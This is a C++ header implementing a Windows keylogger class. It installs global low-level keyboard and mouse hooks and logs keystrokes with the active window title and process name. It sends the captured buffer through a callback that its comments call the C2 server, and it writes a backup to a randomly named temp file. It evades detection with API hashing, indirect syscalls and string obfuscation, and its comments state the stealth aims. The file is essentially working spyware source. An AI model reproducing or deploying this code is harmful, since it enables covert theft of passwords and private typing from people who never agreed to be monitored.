#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <string>
#include <sstream>
#include <fstream>
#include <vector>
#include <map>
#include <chrono>
#include <iomanip>
#include "APIHashing.h"
#include "StringObfuscation.h"

using namespace std;

class Keylogger
{
private:
    static HHOOK g_hKeyHook;
    static HHOOK g_hMouseHook;
    static wstring g_keyBuffer;
    static bool g_isActive;
    static HANDLE g_hMutex;
    static void (*g_callback)(const wstring &);
    static wstring g_logFilePath;
    static wstring g_currentWindow;
    static bool g_logToFile;

    static wstring getKeyName(DWORD vkCode, bool shift)
    {
        static map<DWORD, wstring> specialKeys = {
            {VK_RETURN, L"[ENTER]\n"},
            {VK_SPACE, L" "},
            {VK_TAB, L"[TAB]"},
            {VK_SHIFT, L""},
            {VK_CONTROL, L""},
            {VK_MENU, L""}, // ALT
            {VK_CAPITAL, L""}, // CAPSLOCK ignored
            {VK_ESCAPE, L"[ESC]"},
            {VK_PRIOR, L"[PGUP]"},
            {VK_NEXT, L"[PGDN]"},
            {VK_END, L"[END]"},
            {VK_HOME, L"[HOME]"},
            {VK_LEFT, L"[LEFT]"},
            {VK_UP, L"[UP]"},
            {VK_RIGHT, L"[RIGHT]"},
            {VK_DOWN, L"[DOWN]"},
            {VK_SNAPSHOT, L"[PRTSC]"},
            {VK_INSERT, L"[INS]"},
            {VK_DELETE, L"[DEL]"},
            {VK_LWIN, L"[WIN]"},
            {VK_RWIN, L"[WIN]"},
            {VK_F1, L"[F1]"},
            {VK_F2, L"[F2]"},
            {VK_F3, L"[F3]"},
            {VK_F4, L"[F4]"},
            {VK_F5, L"[F5]"},
            {VK_F6, L"[F6]"},
            {VK_F7, L"[F7]"},
            {VK_F8, L"[F8]"},
            {VK_F9, L"[F9]"},
            {VK_F10, L"[F10]"},
            {VK_F11, L"[F11]"},
            {VK_F12, L"[F12]"}};

        auto it = specialKeys.find(vkCode);
        if (it != specialKeys.end())
        {
            return it->second;
        }

        // Handle printable characters (0-9, A-Z)
        if (vkCode >= 0x30 && vkCode <= 0x5A)
        { // 0-9, A-Z
            wchar_t ch = (wchar_t)vkCode;

            // Convert numbers to symbols when shift is pressed
            if (shift && vkCode >= 0x30 && vkCode <= 0x39)
            {
                static wstring shiftNumbers = L")!@#$%^&*(";
                return wstring(1, shiftNumbers[vkCode - 0x30]);
            }

            // Apply lowercase for letters when shift not pressed
            if (!shift && vkCode >= 0x41 && vkCode <= 0x5A)
            {
                ch = towlower(ch);
            }

            return wstring(1, ch);
        }

        // Handle numpad keys (0-9)
        if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
        {
            return wstring(1, L'0' + (vkCode - VK_NUMPAD0));
        }

        // Map for punctuation and symbols with shift variants
        static map<DWORD, pair<wstring, wstring>> charKeys = {
            {VK_OEM_1, {L";", L":"}},      // ;:
            {VK_OEM_PLUS, {L"=", L"+"}},   // =+
            {VK_OEM_COMMA, {L",", L"<"}},  // ,<
            {VK_OEM_MINUS, {L"-", L"_"}},  // -_
            {VK_OEM_PERIOD, {L".", L">"}}, // .>
            {VK_OEM_2, {L"/", L"?"}},      // /?
            {VK_OEM_3, {L"`", L"~"}},      // `~
            {VK_OEM_4, {L"[", L"{"}},      // [{
            {VK_OEM_5, {L"\\", L"|"}},     // \|
            {VK_OEM_6, {L"]", L"}"}},      // ]}
            {VK_OEM_7, {L"'", L"\""}}      // '"
        };

        auto charIt = charKeys.find(vkCode);
        if (charIt != charKeys.end())
        {
            return shift ? charIt->second.second : charIt->second.first;
        }

        return L"";
    }

    // Retrieve foreground window title and process name
    static wstring GetActiveWindowTitle()
    {
        // Resolve GetForegroundWindow via API hashing
        typedef HWND(WINAPI * pGetForegroundWindow)(VOID);
        auto fnGetWindow = (pGetForegroundWindow)APIResolver::ResolveAPI(APIHash::GetForegroundWindow);
        HWND hwnd = fnGetWindow ? fnGetWindow() : NULL;
        if (hwnd == NULL)
            return L"[Unknown Window]";

        wchar_t windowTitle[256];
        GetWindowTextW(hwnd, windowTitle, 256);

        // Get process name via indirect syscall
        DWORD processId;
        GetWindowThreadProcessId(hwnd, &processId);

        // Prepare client ID and object attributes for NtOpenProcess
        struct
        {
            PVOID UniqueProcess;
            PVOID UniqueThread;
        } clientId;
        clientId.UniqueProcess = (PVOID)(ULONG_PTR)processId;
        clientId.UniqueThread = NULL;

        struct
        {
            ULONG Length;
            HANDLE RootDirectory;
            PVOID ObjectName;
            ULONG Attributes;
            PVOID SecurityDescriptor;
            PVOID SecurityQualityOfService;
        } objAttr = {0};
        objAttr.Length = sizeof(objAttr);

        HANDLE hProcess = NULL;
        IndirectSyscalls::SysNtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);

        wchar_t processName[MAX_PATH];

        if (hProcess != NULL)
        {
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageNameW(hProcess, 0, processName, &size))
            {
                wstring fullPath(processName);
                size_t pos = fullPath.find_last_of(L"\\/");
                if (pos != wstring::npos)
                {
                    fullPath = fullPath.substr(pos + 1);
                }
                CloseHandle(hProcess);
                return wstring(windowTitle) + L" [" + fullPath + L"]";
            }
            CloseHandle(hProcess);
        }

        return wstring(windowTitle);
    }

    // Append keystroke data to log file
    static void WriteToFile(const wstring &data)
    {
        if (!g_logToFile || g_logFilePath.empty())
            return;

        // Convert wide path to UTF-8 for ofstream
        int pathSize = WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, NULL, 0, NULL, NULL);
        if (pathSize <= 0)
            return;

        char *pathBuffer = new char[pathSize];
        WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, pathBuffer, pathSize, NULL, NULL);

        ofstream logFile;
        logFile.open(pathBuffer, ios::app | ios::binary);
        delete[] pathBuffer;

        if (logFile.is_open())
        {
            // Convert wstring to UTF-8
            int size = WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, NULL, 0, NULL, NULL);
            if (size > 0)
            {
                char *buffer = new char[size];
                WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, buffer, size, NULL, NULL);
                logFile.write(buffer, size - 1);
                delete[] buffer;
            }
            logFile.close();
        }
    }

    // Low-level keyboard hook callback (WH_KEYBOARD_LL)
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKb->vkCode;

            // Capture current keyboard state for accurate key interpretation
            BYTE keyboardState[256];
            if (!GetKeyboardState(keyboardState)) {
                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
            }

            wchar_t unicodeBuffer[5] = {0};
            
            // Convert virtual key to Unicode using current keyboard layout
            HWND hwnd = GetForegroundWindow();
            DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
            HKL keyboardLayout = GetKeyboardLayout(threadId);            // Flag 0 handles dead keys and AltGr combinations
            int result = ToUnicodeEx(vkCode, pKb->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
            
            wcout << L"[ToUnicodeEx] result=" << result << L" buffer=[" << unicodeBuffer << L"]" << endl;

            wstring keyName;
            if (result > 0)
            {
                // Successfully captured Unicode character (accents, symbols)
                keyName = wstring(unicodeBuffer, result);
            }
            else
            {
                // Fallback for non-printable keys (arrows, function keys)
                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                keyName = getKeyName(vkCode, shiftPressed);
            }

            // Ignore standalone modifier keys (Shift, Ctrl, Alt)
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
                vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
                vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
                vkCode == VK_CAPITAL)
            {
                // Laisser passer à CallNextHookEx mais ne pas ajouter au buffer
                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
            }

            // Handle backspace to remove last character from buffer
            if (vkCode == VK_BACK)
            {
                WaitForSingleObject(g_hMutex, INFINITE);
                if (!g_keyBuffer.empty())
                {
                    // Remove last char or entire sequence like [TAB]
                    size_t lastNewline = g_keyBuffer.find_last_of(L'\n');
                    size_t lastBracket = g_keyBuffer.find_last_of(L']');
                    
                    // If last char is ] (e.g., [TAB]), remove the entire sequence
                    if (lastBracket != wstring::npos && 
                        (lastNewline == wstring::npos || lastBracket > lastNewline))
                    {
                        size_t openBracket = g_keyBuffer.find_last_of(L'[');
                        if (openBracket != wstring::npos)
                        {
                            g_keyBuffer.erase(openBracket);
                        }
                    }
                    else
                    {
                        // Supprimer 1 caractère
                        g_keyBuffer.pop_back();
                    }
                }
                ReleaseMutex(g_hMutex);
                
                // Do not continue - backspace is not added to the buffer
                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
            }

            if (!keyName.empty())
            {
                // Thread-safe buffer access
                WaitForSingleObject(g_hMutex, INFINITE);

                // Track window changes
                wstring activeWindow = GetActiveWindowTitle();
                if (activeWindow != g_currentWindow)
                {
                    g_currentWindow = activeWindow;

                    // Get timestamp
                    auto now = chrono::system_clock::now();
                    auto timeT = chrono::system_clock::to_time_t(now);
                    tm localTime;
                    localtime_s(&localTime, &timeT);

                    wstringstream timestamp;
                    timestamp << L"\n\n[" << put_time(&localTime, L"%Y-%m-%d %H:%M:%S")
                              << L"] Window: " << g_currentWindow << L"\n";

                    g_keyBuffer += timestamp.str();
                }

                // Morphological keylogger: send buffer on Enter key press
                if (vkCode == VK_RETURN)
                {
                    // Add [ENTER] to the buffer
                    g_keyBuffer += L"[ENTER]\n";
                    
                    wstring bufferCopy = g_keyBuffer;
                    g_keyBuffer.clear();
                    
                    ReleaseMutex(g_hMutex);

                    // Transmit to C2 server with exponential backoff retry
                    if (g_callback != nullptr)
                    {
                        bool sent = false;
                        for (int retry = 0; retry < 3 && !sent; retry++)
                        {
                            try
                            {
                                g_callback(bufferCopy);
                                sent = true;
                            }
                            catch (...)
                            {
                                Sleep(100 * (1 << retry)); // Exponential backoff: 100ms, 200ms, 400ms
                            }
                        }
                    }

                    // Write to local file as backup
                    WriteToFile(bufferCopy);
                }
                else
                {
                    // Not ENTER, add the character to the buffer
                    g_keyBuffer += keyName;
                    ReleaseMutex(g_hMutex);
                }
            }
        }

        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
        return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
    }

    // Low-level mouse hook callback (right-click triggers buffer send)
    static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && wParam == WM_RBUTTONDOWN)
        {
            // Right-click detected - send current buffer (simulates form submission)
            WaitForSingleObject(g_hMutex, INFINITE);

            if (!g_keyBuffer.empty())
            {
                wstring bufferCopy = g_keyBuffer;
                g_keyBuffer.clear();

                // Send to C2 with retry logic (3 attempts)
                if (g_callback != nullptr)
                {
                    bool sent = false;
                    for (int retry = 0; retry < 3 && !sent; retry++)
                    {
                        try
                        {
                            g_callback(bufferCopy);
                            sent = true;
                        }
                        catch (...)
                        {
                            Sleep(100 * (1 << retry));
                        }
                    }
                }

                // Write to local file as backup
                WriteToFile(bufferCopy);
            }

            ReleaseMutex(g_hMutex);
        }

        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
        return fnCallNext ? fnCallNext(g_hMouseHook, nCode, wParam, lParam) : CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
    }

public:
    // Initialize and start keylogger hooks
    static bool Start(void (*callback)(const wstring &) = nullptr, bool logToFile = true, const wstring &logPath = L"")
    {
        if (g_isActive)
        {
            return false;
        }

        g_callback = callback;
        g_keyBuffer.clear();
        g_logToFile = logToFile;

        // Generate random filename in temp directory for stealth
        if (logPath.empty())
        {
            // Generate random filename for stealth (avoid IoC detection)
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);

            // Random 8-char hex filename (e.g., 3f8a9b2c.tmp)
            DWORD seed = GetTickCount() ^ (DWORD)(ULONG_PTR)&g_keyBuffer;
            wchar_t randomName[16];
            swprintf_s(randomName, L"%08x.tmp", seed);
            g_logFilePath = wstring(tempPath) + randomName;
        }
        else
        {
            g_logFilePath = logPath;
        }

        // Write header to log file
        if (g_logToFile)
        {
            auto now = chrono::system_clock::now();
            auto timeT = chrono::system_clock::to_time_t(now);
            tm localTime;
            localtime_s(&localTime, &timeT);

            wstringstream header;
            header << L"========================================\n"
                   << OBFUSCATE_W(L"Session Started") << L"\n"
                   << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                   << L"========================================\n";
            WriteToFile(header.str());
        }

        g_hMutex = CreateMutexW(NULL, FALSE, NULL);

        wcout << L"[KEYLOGGER] Installing keyboard hook..." << endl;

        // Install system-wide keyboard hook (no API hashing)
        g_hKeyHook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            KeyboardProc,
            GetModuleHandleW(NULL),
            0);

        if (g_hKeyHook == NULL)
        {
            DWORD err = GetLastError();
            wcout << L"[ERROR] SetWindowsHookExW (keyboard) failed, error: " << err << endl;
            CloseHandle(g_hMutex);
            return false;
        }
        else
        {
            wcout << L"[OK] Keyboard hook installed successfully!" << endl;
        }

        if (g_hKeyHook == NULL)
        {
            CloseHandle(g_hMutex);
            return false;
        }

        // Install low-level mouse hook for right-click detection
        wcout << L"[KEYLOGGER] Installing mouse hook..." << endl;

        // Install system-wide mouse hook for right-click detection
        g_hMouseHook = SetWindowsHookExW(
            WH_MOUSE_LL,
            MouseProc,
            GetModuleHandleW(NULL),
            0);

        if (g_hMouseHook == NULL)
        {
            DWORD err = GetLastError();
            wcout << L"[ERROR] SetWindowsHookExW (mouse) failed, error: " << err << endl;
            UnhookWindowsHookEx(g_hKeyHook);
            CloseHandle(g_hMutex);
            return false;
        }
        else
        {
            wcout << L"[OK] Mouse hook installed successfully!" << endl;
        }

        g_isActive = true;
        g_currentWindow.clear();
        return true;
    }

    // Stop keylogger and flush remaining buffer
    static void Stop()
    {
        if (!g_isActive)
        {
            return;
        }

        // Flush any remaining keystroke data before stopping
        if (!g_keyBuffer.empty())
        {
            WaitForSingleObject(g_hMutex, INFINITE);
            wstring bufferCopy = g_keyBuffer;
            g_keyBuffer.clear();
            ReleaseMutex(g_hMutex);

            WriteToFile(bufferCopy);
            if (g_callback != nullptr)
            {
                g_callback(bufferCopy);
            }
        }

        // Write footer to log file
        if (g_logToFile)
        {
            auto now = chrono::system_clock::now();
            auto timeT = chrono::system_clock::to_time_t(now);
            tm localTime;
            localtime_s(&localTime, &timeT);

            wstringstream footer;
            footer << L"\n========================================\n"
                   << OBFUSCATE_W(L"Session Ended") << L"\n"
                   << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                   << L"========================================\n\n";
            WriteToFile(footer.str());
        }

        if (g_hKeyHook != NULL)
        {
            UnhookWindowsHookEx(g_hKeyHook);
            g_hKeyHook = NULL;
        }

        if (g_hMouseHook != NULL)
        {
            UnhookWindowsHookEx(g_hMouseHook);
            g_hMouseHook = NULL;
        }

        if (g_hMutex != NULL)
        {
            CloseHandle(g_hMutex);
            g_hMutex = NULL;
        }

        g_isActive = false;
    }

    static wstring GetBuffer()
    {
        WaitForSingleObject(g_hMutex, INFINITE);
        wstring buffer = g_keyBuffer;
        g_keyBuffer.clear();
        ReleaseMutex(g_hMutex);
        return buffer;
    }

    static bool IsActive()
    {
        return g_isActive;
    }

    static wstring GetLogFilePath()
    {
        return g_logFilePath;
    }

    static void SetLogFilePath(const wstring &path)
    {
        WaitForSingleObject(g_hMutex, INFINITE);
        g_logFilePath = path;
        ReleaseMutex(g_hMutex);
    }

    static void EnableFileLogging(bool enable)
    {
        g_logToFile = enable;
    }
};

// Static member initialization
HHOOK Keylogger::g_hKeyHook = NULL;
HHOOK Keylogger::g_hMouseHook = NULL;
wstring Keylogger::g_keyBuffer;
bool Keylogger::g_isActive = false;
HANDLE Keylogger::g_hMutex = NULL;
void (*Keylogger::g_callback)(const wstring &) = nullptr;
wstring Keylogger::g_logFilePath;
wstring Keylogger::g_currentWindow;
bool Keylogger::g_logToFile = true;

#endif // KEYLOGGER_H
